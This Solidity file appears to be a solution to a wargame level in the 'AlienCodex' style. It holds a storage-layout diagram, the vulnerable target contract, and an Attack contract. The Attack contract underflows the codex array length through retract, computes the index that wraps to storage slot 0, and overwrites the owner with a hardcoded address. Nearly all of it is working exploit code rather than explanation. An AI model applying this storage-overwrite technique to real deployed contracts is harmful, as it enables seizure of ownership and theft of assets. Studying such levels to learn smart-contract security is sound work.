// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import '@openzeppelin/contracts/ownership/Ownable.sol';

/*
    EVM total storage slots size = 2^256 - 1

    slots
    ----------------------
    |  2^256 - 1 - slotp  | t = 2^256 - 1 - slotp + 1
    ----------------------
    |     ............    |
    ----------------------
    |     array index 2   |
    ----------------------
    |     array index 1   |
    ----------------------
    |     array index 0   | assume p = keccak256(1), the array data start at slotp
    ----------------------
    |                     |
    ----------------------
    |                     |
    ----------------------
    |                     |
    ----------------------
    |                     |
    ----------------------
    |                     | slot1 codex length
    ----------------------
    |     array index t   | slot0 contact(1 byte) + owner(20 bytes)
    ----------------------
*/
contract Attack {
    AlienCodex aliencodex;

    constructor(address target) public {
        aliencodex = AlienCodex(target);
    }

    function attack() external {
        aliencodex.make_contact();
        aliencodex.retract();
        bytes32 one = keccak256(abi.encode(1));
        uint256 index = uint256(0) - 1 - uint256(one) + 1;
        bytes32 content = 0x00000000000000000000000107fF0ed51ABAf0ebeF2dDdabB463A0E17235de46;
        aliencodex.revise(index, content);
        require(aliencodex.owner() == 0x07fF0ed51ABAf0ebeF2dDdabB463A0E17235de46, 'attack failed');
    }
}

// source code
contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }

  function length() external view returns(uint256) {
    return codex.length;
  }
}